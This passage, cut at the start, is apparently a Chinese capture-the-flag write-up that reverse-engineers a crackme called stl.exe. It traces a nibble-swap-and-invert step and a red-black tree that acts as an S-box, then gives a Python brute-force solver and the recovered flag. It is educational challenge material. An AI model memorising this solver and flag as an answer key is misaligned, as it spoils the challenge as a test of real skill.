class="keyword">return</span> &amp;a1-&gt;ptr[a2];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">enc</span><span class="params">(<span class="type">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~((<span class="number">16</span> * a1) | (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)a1 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最关键的，就是这个左移右移处理过后的字符传入的这个函数4b7d90，我们可以看到最后是将4个字节拼凑成一个然后做了一些操作，那么这个4b7d90的加密就很重要。</p><h1>关键函数分析</h1><p>开始入手的时候试图分析这个函数，但是跟进发现一拖史，调用套调用最后看不懂，而且相当多功能简单（直接返回，返回arg+8）的函数没有复用都是新的符号：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4B7D90</span><span class="params">(<span class="keyword">struct</span> my_rbtree_header *rb_tree, <span class="type">char</span> *enc_byte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *off32; <span class="comment">// rax</span></span><br><span class="line">  __int64 enc_byte2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-48h] BYREF</span></span><br><span class="line">  __int64 off8_ptr; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+4Eh] [rbp-32h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+4Fh] [rbp-31h] BYREF</span></span><br><span class="line">  _BYTE v11[<span class="number">8</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  _QWORD v12[<span class="number">3</span>]; <span class="comment">// [rsp+58h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7 = <span class="built_in">sub_4B7B00</span>((__int64)rb_tree, (__int64)enc_byte);<span class="comment">// 0x10返回</span></span><br><span class="line">  off8_ptr = <span class="built_in">get_off8_ptr_</span>((__int64)rb_tree);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">isderefArg1_eq_derefArg2</span>(&amp;v7, &amp;off8_ptr)</span><br><span class="line">    || (<span class="built_in">sub_429160</span>(rb_tree), off32 = (_BYTE *)<span class="built_in">get_off32</span>(&amp;v7), <span class="built_in">isArg2_below_arg3</span>((__int64)&amp;v9, enc_byte, off32)) )</span><br><span class="line">  &#123;</span><br><span class="line">    enc_byte2 = <span class="built_in">just_ret3</span>((__int64)enc_byte);</span><br><span class="line">    <span class="built_in">sub_4D5BA0</span>((__int64)v11, enc_byte2, v5);</span><br><span class="line">    <span class="built_in">sub_4B79E0</span>(v12, &amp;v7);</span><br><span class="line">    v7 = <span class="built_in">sub_4CD350</span>((_DWORD)rb_tree, v12[<span class="number">0</span>], (<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_4E6000, (<span class="type">unsigned</span> <span class="type">int</span>)v11, (__int64)&amp;v10);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">get_off32</span>(&amp;v7) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看不懂在干嘛，看STL相关结构的同时决定动调。</p><p>我们能看到这个函数接收了两个参数，这第一个参数就很重要。回到主函数的开头，这个变量参与了这样一个函数（当然名字是做出来之后才有的）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tree_create</span>(&amp;rb_tree, ssm00.m128i_i64, (__int64)&amp;v31, (__int64)&amp;v32);</span><br></pre></td></tr></table></figure><p>这个函数的内容我们也看不懂，但是不重要，它接受的第二个参数很有意思，在前面的初始化过程中，它存储的是一段神秘数据的指针。检查的时候这段数据是从0-FF依次对应另一个字节，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">memcpy</span>(ascii_db0, ascii_db, <span class="keyword">sizeof</span>(ascii_db0));</span><br><span class="line">  ssm1.m128i_i64[<span class="number">0</span>] = (__int64)ascii_db0;</span><br><span class="line">  ssm1.m128i_i64[<span class="number">1</span>] = <span class="number">256LL</span>;</span><br><span class="line">  nop3((__int64)&amp;v32);</span><br><span class="line">  ssm00 = _mm_load_si128(&amp;ssm1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类似于这样：</span></span><br><span class="line">.data:<span class="number">00000000004E2020</span> ascii_db        my_bytes &lt;   <span class="number">0</span>,  <span class="number">2</span>Eh&gt;   ; <span class="number">0</span></span><br><span class="line">.data:<span class="number">00000000004E2020</span>                                         ; DATA XREF: main+<span class="number">186</span>↑o</span><br><span class="line">.data:<span class="number">00000000004E2022</span>                 my_bytes &lt;   <span class="number">1</span>,  <span class="number">7</span>Dh&gt;   ; <span class="number">1</span></span><br><span class="line">.data:<span class="number">00000000004E2024</span>                 my_bytes &lt;   <span class="number">2</span>, <span class="number">0</span>C5h&gt;   ; <span class="number">2</span></span><br><span class="line">.data:<span class="number">00000000004E2026</span>                 my_bytes &lt;   <span class="number">3</span>,  <span class="number">1</span>Dh&gt;   ; <span class="number">3</span></span><br><span class="line">.data:<span class="number">00000000004E2028</span>                 my_bytes &lt;   <span class="number">4</span>,  <span class="number">96</span>h&gt;   ; <span class="number">4</span></span><br><span class="line">.data:<span class="number">00000000004E202</span>A                 my_bytes &lt;   <span class="number">5</span>, <span class="number">0B</span>Ah&gt;   ; <span class="number">5</span></span><br><span class="line">.data:<span class="number">00000000004E202</span>C                 my_bytes &lt;   <span class="number">6</span>,  <span class="number">4</span>Ah&gt;   ; <span class="number">6</span></span><br><span class="line">... <span class="comment">//连续存储</span></span><br></pre></td></tr></table></figure><p>这个东西程序一拿到手就修了，但是不知道在哪用的。但是很重要的是，我们的输入函数还在靠后的位置，前面初始化的这些东西都和输入无关，代表他们都是死的，动调到输入之前看看初始化的都是什么，如果是一些加密用的东西直接dump出来就不用分析函数了。抱着这个心态，发现了红黑树：</p><p>动调之后函数一过：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A20                 dq offset unk_A31E80</span><br><span class="line">Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A28                 dq <span class="number">0</span></span><br><span class="line">Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A30                 dq offset unk_B54690</span><br><span class="line">Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A38                 dq offset unk_A31EF0</span><br><span class="line">Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A40                 dq offset unk_B58E90</span><br><span class="line">Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A48                 dq <span class="number">100</span>h</span><br></pre></td></tr></table></figure><p>6个指针，跟进去看结构，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">debug030:<span class="number">0000000000B</span>54690 dword_B54690    dd <span class="number">1</span>                    ; DATA XREF: Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A30↑o</span><br><span class="line">debug030:<span class="number">0000000000B</span>54694                 dd <span class="number">0B</span>AADF00Dh</span><br><span class="line">debug030:<span class="number">0000000000B</span>54698                 dq offset qword_71FA28</span><br><span class="line">debug030:<span class="number">0000000000B</span>546A0                 dq offset unk_A32A90</span><br><span class="line">debug030:<span class="number">0000000000B</span>546A8                 dq offset unk_B55E90</span><br><span class="line">debug030:<span class="number">0000000000B</span>546B0                 db  <span class="number">3F</span>h ; ?</span><br></pre></td></tr></table></figure><p>parent指向header，左右指针，红黑树是八九不离十了。这时候我们就可以猜测这个函数是建立了一棵树，结合我们前面看到的那个下标-字符数组，我们就可以大胆猜测是按照那个数组建立的，加密函数是按照某种逻辑（对应下标）从这个树上搜一个值出来。</p><p>黑盒测试，前面经过动调已经知道输入特定字符加密过后是不变的了，这时候我们去看那个数组的0x61看是不是a加密后的3a，发现不是。动调之后再猜测，这棵树是一个S盒，我们是把加密后的那个字符输入然后返回一个代换字符，确定不了，把这个数组dump出来转成S盒还原一下加密逻辑，结果和动调获得的一致，加密逻辑就分析出来了：<strong>按照索引建立一个红黑树，本质上是一个S盒代换</strong></p><p>最后就是将4个字节拼起来放在一个vector里（动调看内存确定的）。前面栈上那9个初始化的32位变量就是被放进了vector，最后的比较也是传两个vector，那么最后肯定是我们的输入加密后和那个初始化的比较了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vector</span></span><br><span class="line">Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A50                 dq offset unk_A31E90 <span class="comment">//start</span></span><br><span class="line">Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A58                 dq offset unk_A31EB4 <span class="comment">//end</span></span><br><span class="line">Stack[<span class="number">00006B</span>A8]:<span class="number">000000000071F</span>A60                 dq offset unk_A31EB4 <span class="comment">//capacity_end</span></span><br></pre></td></tr></table></figure><h1>exp</h1><p>逆向s盒不会写，按字节也就256个，按字节爆破和结果比对出flag就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a(0x61)-0x3a b-0x4e c-0xa7 d-0x88 连在一起</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 首先将输入的ascii进行enc后取后两位索引红黑树查找，db事先写好在程序</span></span><br><span class="line"><span class="comment"># 一轮4个，拿到4个字节按顺序拼在一起装入vector</span></span><br><span class="line"><span class="comment"># 猜测最后要和栈上的比较</span></span><br><span class="line"><span class="comment"># 尝试</span></span><br><span class="line">ascii_db =[</span><br><span class="line">    <span class="number">0</span>,  <span class="number">46</span>,   <span class="number">1</span>, <span class="number">125</span>,   <span class="number">2</span>, <span class="number">197</span>,   <span class="number">3</span>,  <span class="number">29</span>,   <span class="number">4</span>, <span class="number">150</span>, </span><br><span class="line">    <span class="number">5</span>, <span class="number">186</span>,   <span class="number">6</span>,  <span class="number">74</span>,   <span class="number">7</span>, <span class="number">174</span>,   <span class="number">8</span>,  <span class="number">17</span>,   <span class="number">9</span>, <span class="number">179</span>, </span><br><span class="line">   <span class="number">10</span>,  <span class="number">33</span>,  <span class="number">11</span>, <span class="number">230</span>,  <span class="number">12</span>, <span class="number">110</span>,  <span class="number">13</span>, <span class="number">187</span>,  <span class="number">14</span>,  <span class="number">27</span>, </span><br><span class="line">   <span class="number">15</span>, <span class="number">205</span>,  <span class="number">16</span>, <span class="number">203</span>,  <span class="number">17</span>,  <span class="number">52</span>,  <span class="number">18</span>, <span class="number">221</span>,  <span class="number">19</span>, <span class="number">102</span>, </span><br><span class="line">   <span class="number">20</span>, <span class="number">183</span>,  <span class="number">21</span>,  <span class="number">91</span>,  <span class="number">22</span>, <span class="number">148</span>,  <span class="number">23</span>,  <span class="number">65</span>,  <span class="number">24</span>,  <span class="number">90</span>, </span><br><span class="line">   <span class="number">25</span>,  <span class="number">54</span>,  <span class="number">26</span>, <span class="number">137</span>,  <span class="number">27</span>, <span class="number">122</span>,  <span class="number">28</span>, <span class="number">233</span>,  <span class="number">29</span>,  <span class="number">96</span>, </span><br><span class="line">   <span class="number">30</span>,  <span class="number">70</span>,  <span class="number">31</span>, <span class="number">251</span>,  <span class="number">32</span>,  <span class="number">19</span>,  <span class="number">33</span>,  <span class="number">16</span>,  <span class="number">34</span>, <span class="number">134</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">220</span>,  <span class="number">36</span>, <span class="number">191</span>,  <span class="number">37</span>, <span class="number">114</span>,  <span class="number">38</span>,  <span class="number">95</span>,  <span class="number">39</span>,  <span class="number">24</span>, </span><br><span class="line">   <span class="number">40</span>,   <span class="number">7</span>,  <span class="number">41</span>, <span class="number">237</span>,  <span class="number">42</span>, <span class="number">216</span>,  <span class="number">43</span>, <span class="number">162</span>,  <span class="number">44</span>, <span class="number">164</span>, </span><br><span class="line">   <span class="number">45</span>, <span class="number">243</span>,  <span class="number">46</span>,  <span class="number">25</span>,  <span class="number">47</span>,  <span class="number">32</span>,  <span class="number">48</span>, <span class="number">242</span>,  <span class="number">49</span>, <span class="number">169</span>, </span><br><span class="line">   <span class="number">50</span>,  <span class="number">38</span>,  <span class="number">51</span>,  <span class="number">72</span>,  <span class="number">52</span>,  <span class="number">97</span>,  <span class="number">53</span>, <span class="number">107</span>,  <span class="number">54</span>, <span class="number">101</span>, </span><br><span class="line">   <span class="number">55</span>,  <span class="number">84</span>,  <span class="number">56</span>, <span class="number">234</span>,  <span class="number">57</span>, <span class="number">212</span>,  <span class="number">58</span>, <span class="number">225</span>,  <span class="number">59</span>,   <span class="number">5</span>, </span><br><span class="line">   <span class="number">60</span>,  <span class="number">12</span>,  <span class="number">61</span>,  <span class="number">43</span>,  <span class="number">62</span>,  <span class="number">14</span>,  <span class="number">63</span>, <span class="number">176</span>,  <span class="number">64</span>,  <span class="number">47</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">99</span>,  <span class="number">66</span>,  <span class="number">48</span>,  <span class="number">67</span>, <span class="number">199</span>,  <span class="number">68</span>,  <span class="number">85</span>,  <span class="number">69</span>, <span class="number">210</span>, </span><br><span class="line">   <span class="number">70</span>, <span class="number">133</span>,  <span class="number">71</span>,  <span class="number">82</span>,  <span class="number">72</span>, <span class="number">214</span>,  <span class="number">73</span>, <span class="number">228</span>,  <span class="number">74</span>, <span class="number">156</span>, </span><br><span class="line">   <span class="number">75</span>, <span class="number">139</span>,  <span class="number">76</span>,   <span class="number">0</span>,  <span class="number">77</span>,  <span class="number">23</span>,  <span class="number">78</span>, <span class="number">145</span>,  <span class="number">79</span>,  <span class="number">40</span>, </span><br><span class="line">   <span class="number">80</span>, <span class="number">198</span>,  <span class="number">81</span>, <span class="number">178</span>,  <span class="number">82</span>,  <span class="number">50</span>,  <span class="number">83</span>,  <span class="number">79</span>,  <span class="number">84</span>, <span class="number">103</span>, </span><br><span class="line">   <span class="number">85</span>, <span class="number">106</span>,  <span class="number">86</span>,  <span class="number">51</span>,  <span class="number">87</span>,   <span class="number">2</span>,  <span class="number">88</span>,  <span class="number">45</span>,  <span class="number">89</span>,  <span class="number">75</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">215</span>,  <span class="number">91</span>, <span class="number">238</span>,  <span class="number">92</span>, <span class="number">154</span>,  <span class="number">93</span>, <span class="number">184</span>,  <span class="number">94</span>, <span class="number">226</span>, </span><br><span class="line">   <span class="number">95</span>, <span class="number">173</span>,  <span class="number">96</span>, <span class="number">208</span>,  <span class="number">97</span>, <span class="number">211</span>,  <span class="number">98</span>,  <span class="number">73</span>,  <span class="number">99</span>, <span class="number">135</span>, </span><br><span class="line">  <span class="number">100</span>,   <span class="number">6</span>, <span class="number">101</span>,  <span class="number">36</span>, <span class="number">102</span>, <span class="number">192</span>, <span class="number">103</span>, <span class="number">161</span>, <span class="number">104</span>,  <span class="number">15</span>, </span><br><span class="line">  <span class="number">105</span>, <span class="number">194</span>, <span class="number">106</span>,  <span class="number">92</span>, <span class="number">107</span>,  <span class="number">10</span>, <span class="number">108</span>, <span class="number">170</span>, <span class="number">109</span>, <span class="number">111</span>, </span><br><span class="line">  <span class="number">110</span>,  <span class="number">56</span>, <span class="number">111</span>, <span class="number">249</span>, <span class="number">112</span>, <span class="number">223</span>, <span class="number">113</span>, <span class="number">138</span>, <span class="number">114</span>,   <span class="number">9</span>, </span><br><span class="line">  <span class="number">115</span>, <span class="number">132</span>, <span class="number">116</span>, <span class="number">146</span>, <span class="number">117</span>,  <span class="number">63</span>, <span class="number">118</span>,  <span class="number">94</span>, <span class="number">119</span>,  <span class="number">67</span>, </span><br><span class="line">  <span class="number">120</span>, <span class="number">155</span>, <span class="number">121</span>,  <span class="number">68</span>, <span class="number">122</span>,  <span class="number">62</span>, <span class="number">123</span>,   <span class="number">3</span>, <span class="number">124</span>, <span class="number">181</span>, </span><br><span class="line">  <span class="number">125</span>,  <span class="number">41</span>, <span class="number">126</span>, <span class="number">190</span>, <span class="number">127</span>,  <span class="number">26</span>, <span class="number">128</span>, <span class="number">151</span>, <span class="number">129</span>,  <span class="number">13</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">118</span>, <span class="number">131</span>, <span class="number">188</span>, <span class="number">132</span>, <span class="number">207</span>, <span class="number">133</span>, <span class="number">105</span>, <span class="number">134</span>, <span class="number">189</span>, </span><br><span class="line">  <span class="number">135</span>,  <span class="number">60</span>, <span class="number">136</span>,  <span class="number">80</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">138</span>,  <span class="number">88</span>, <span class="number">139</span>,   <span class="number">4</span>, </span><br><span class="line">  <span class="number">140</span>,  <span class="number">18</span>, <span class="number">141</span>, <span class="number">209</span>, <span class="number">142</span>, <span class="number">244</span>, <span class="number">143</span>,  <span class="number">34</span>, <span class="number">144</span>, <span class="number">253</span>, </span><br><span class="line">  <span class="number">145</span>,  <span class="number">49</span>, <span class="number">146</span>, <span class="number">147</span>, <span class="number">147</span>, <span class="number">182</span>, <span class="number">148</span>, <span class="number">123</span>, <span class="number">149</span>,  <span class="number">61</span>, </span><br><span class="line">  <span class="number">150</span>,  <span class="number">20</span>, <span class="number">151</span>,  <span class="number">22</span>, <span class="number">152</span>, <span class="number">157</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">154</span>, <span class="number">204</span>, </span><br><span class="line">  <span class="number">155</span>,  <span class="number">64</span>, <span class="number">156</span>, <span class="number">159</span>, <span class="number">157</span>,  <span class="number">28</span>, <span class="number">158</span>, <span class="number">152</span>, <span class="number">159</span>, <span class="number">158</span>, </span><br><span class="line">  <span class="number">160</span>,  <span class="number">98</span>, <span class="number">161</span>,  <span class="number">89</span>, <span class="number">162</span>, <span class="number">124</span>, <span class="number">163</span>, <span class="number">239</span>, <span class="number">164</span>, <span class="number">168</span>, </span><br><span class="line">  <span class="number">165</span>, <span class="number">231</span>, <span class="number">166</span>, <span class="number">255</span>, <span class="number">167</span>, <span class="number">131</span>, <span class="number">168</span>, <span class="number">227</span>, <span class="number">169</span>,  <span class="number">57</span>, </span><br><span class="line">  <span class="number">170</span>,  <span class="number">86</span>, <span class="number">171</span>, <span class="number">247</span>, <span class="number">172</span>, <span class="number">100</span>, <span class="number">173</span>, <span class="number">248</span>, <span class="number">174</span>, <span class="number">109</span>, </span><br><span class="line">  <span class="number">175</span>, <span class="number">172</span>, <span class="number">176</span>, <span class="number">165</span>, <span class="number">177</span>, <span class="number">246</span>, <span class="number">178</span>, <span class="number">241</span>, <span class="number">179</span>, <span class="number">121</span>, </span><br><span class="line">  <span class="number">180</span>,  <span class="number">83</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">182</span>, <span class="number">177</span>, <span class="number">183</span>,  <span class="number">93</span>, <span class="number">184</span>, <span class="number">112</span>, </span><br><span class="line">  <span class="number">185</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">144</span>, <span class="number">187</span>, <span class="number">236</span>, <span class="number">188</span>, <span class="number">126</span>, <span class="number">189</span>, <span class="number">180</span>, </span><br><span class="line">  <span class="number">190</span>, <span class="number">142</span>, <span class="number">191</span>,  <span class="number">37</span>, <span class="number">192</span>, <span class="number">195</span>, <span class="number">193</span>, <span class="number">224</span>, <span class="number">194</span>, <span class="number">160</span>, </span><br><span class="line">  <span class="number">195</span>,  <span class="number">59</span>, <span class="number">196</span>, <span class="number">143</span>, <span class="number">197</span>, <span class="number">185</span>, <span class="number">198</span>, <span class="number">196</span>, <span class="number">199</span>, <span class="number">113</span>, </span><br><span class="line">  <span class="number">200</span>, <span class="number">120</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">202</span>,  <span class="number">35</span>, <span class="number">203</span>, <span class="number">235</span>, <span class="number">204</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">205</span>,  <span class="number">66</span>, <span class="number">206</span>, <span class="number">108</span>, <span class="number">207</span>, <span class="number">229</span>, <span class="number">208</span>, <span class="number">245</span>, <span class="number">209</span>,   <span class="number">1</span>, </span><br><span class="line">  <span class="number">210</span>,  <span class="number">53</span>, <span class="number">211</span>, <span class="number">117</span>, <span class="number">212</span>, <span class="number">171</span>, <span class="number">213</span>, <span class="number">166</span>, <span class="number">214</span>,  <span class="number">39</span>, </span><br><span class="line">  <span class="number">215</span>, <span class="number">250</span>, <span class="number">216</span>,  <span class="number">81</span>, <span class="number">217</span>,  <span class="number">78</span>, <span class="number">218</span>, <span class="number">140</span>, <span class="number">219</span>, <span class="number">130</span>, </span><br><span class="line">  <span class="number">220</span>, <span class="number">104</span>, <span class="number">221</span>,  <span class="number">31</span>, <span class="number">222</span>,  <span class="number">69</span>, <span class="number">223</span>, <span class="number">217</span>, <span class="number">224</span>, <span class="number">175</span>, </span><br><span class="line">  <span class="number">225</span>, <span class="number">193</span>, <span class="number">226</span>,  <span class="number">11</span>, <span class="number">227</span>, <span class="number">128</span>, <span class="number">228</span>,  <span class="number">77</span>, <span class="number">229</span>, <span class="number">153</span>, </span><br><span class="line">  <span class="number">230</span>, <span class="number">254</span>, <span class="number">231</span>,  <span class="number">42</span>, <span class="number">232</span>, <span class="number">149</span>, <span class="number">233</span>,  <span class="number">58</span>, <span class="number">234</span>,  <span class="number">55</span>, </span><br><span class="line">  <span class="number">235</span>, <span class="number">119</span>, <span class="number">236</span>, <span class="number">116</span>, <span class="number">237</span>, <span class="number">200</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">239</span>, <span class="number">240</span>, </span><br><span class="line">  <span class="number">240</span>,  <span class="number">76</span>, <span class="number">241</span>, <span class="number">219</span>, <span class="number">242</span>, <span class="number">201</span>, <span class="number">243</span>,   <span class="number">8</span>, <span class="number">244</span>, <span class="number">202</span>, </span><br><span class="line">  <span class="number">245</span>,  <span class="number">21</span>, <span class="number">246</span>, <span class="number">206</span>, <span class="number">247</span>,  <span class="number">87</span>, <span class="number">248</span>,  <span class="number">30</span>, <span class="number">249</span>, <span class="number">127</span>, </span><br><span class="line">  <span class="number">250</span>, <span class="number">213</span>, <span class="number">251</span>,  <span class="number">44</span>, <span class="number">252</span>, <span class="number">222</span>, <span class="number">253</span>, <span class="number">232</span>, <span class="number">254</span>, <span class="number">252</span>, </span><br><span class="line">  <span class="number">255</span>,  <span class="number">71</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">Sbox = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将原本代码中的红黑树搜索转化成Sbox代换</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ascii_db), <span class="number">2</span>):</span><br><span class="line">    index = ascii_db[i]</span><br><span class="line">    value = ascii_db[i + <span class="number">1</span>]</span><br><span class="line">    Sbox[index] = value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_chr</span> (c):</span><br><span class="line">    <span class="keyword">return</span> ~((c&lt;&lt;<span class="number">4</span>)|(c&gt;&gt;<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">result = [</span><br><span class="line">    <span class="number">0xA7</span>,<span class="number">0x39</span>,<span class="number">0x8D</span>,<span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0x7E</span>,<span class="number">0xA7</span>,<span class="number">0x88</span>,<span class="number">0x7E</span>,</span><br><span class="line">    <span class="number">0xF3</span>,<span class="number">0xDE</span>,<span class="number">0x7E</span>,<span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0xB5</span>,<span class="number">0xF3</span>,<span class="number">0x7E</span>,<span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0x73</span>,<span class="number">0x3A</span>,<span class="number">0xF3</span>,<span class="number">0x88</span>,</span><br><span class="line">    <span class="number">0x7E</span>,<span class="number">0xDE</span>,<span class="number">0x73</span>,<span class="number">0xF3</span>,</span><br><span class="line">    <span class="number">0xA7</span>,<span class="number">0xDE</span>,<span class="number">0x8D</span>,<span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xA7</span>,<span class="number">0xDE</span>,<span class="number">0xA7</span>,<span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0x8D</span>,<span class="number">0x7E</span>,<span class="number">0xB5</span>,<span class="number">0x7E</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params"><span class="built_in">chr</span></span>):</span><br><span class="line">    <span class="built_in">chr</span> = <span class="built_in">int</span>(<span class="built_in">chr</span>)</span><br><span class="line">    idx = enc_chr(<span class="built_in">chr</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    crypt = Sbox[idx]</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> result:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> enc(c) == r:</span><br><span class="line">            flag += <span class="built_in">bytes</span>([c])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># result = enc_chr(int(0x64)) &amp; 0xFF</span></span><br><span class="line"><span class="comment"># print(hex(inv_Sbox[Sbox[int(result)]]))</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS D:\学校相关文件\逆向工程\stl&gt; .\stl.exe</span><br><span class="line">cefe4cd4-04e8-473a-d403-c0f9c0cef484</span><br><span class="line">you find it, flag is 